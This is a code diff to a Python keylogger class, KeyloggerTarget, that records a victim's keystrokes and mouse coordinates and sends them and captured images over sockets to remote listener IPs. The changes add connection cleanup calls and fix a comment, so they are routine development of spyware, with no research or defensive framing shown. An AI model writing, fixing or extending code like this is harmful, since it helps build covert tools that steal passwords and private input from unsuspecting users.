@@ -91,6 +91,7 @@ class KeyloggerTarget:
                     break
                 except:
                     continue
+            listening_data.close()
 
 
         except OSError:
@@ -105,6 +106,7 @@ class KeyloggerTarget:
                 except:
                     continue
             # Sends data to ServerListener
+            listening_data.close()
 
     def client(self):
         self.amount += 1
@@ -140,7 +142,7 @@ class KeyloggerTarget:
                 break
             except:
                 continue
-
+        send_images.close()
         sys.exit()
 
     def countdown_send(self, zeit, ip_photos, port_photos, ip_keylogger, port_keylogger):
@@ -176,6 +178,7 @@ class KeyloggerTarget:
             all_data = str(self.coordinates) + wort
             # Coordinates and keydata are being concatenated
             key_data.send(all_data.encode())
+            key_data.close()
             print(wort)
             print(self.richtige_liste)
             # Closes the image
@@ -392,4 +395,4 @@ class KeyloggerTarget:
             self.countdown_send(self.duration, self.ip_photos, self.port_photos, self.ip_keylogger,
                                 self.port_keylogger)
             listener.join()
-            # This listens to the keys that where ty
+            # This listens to the keys that where typed
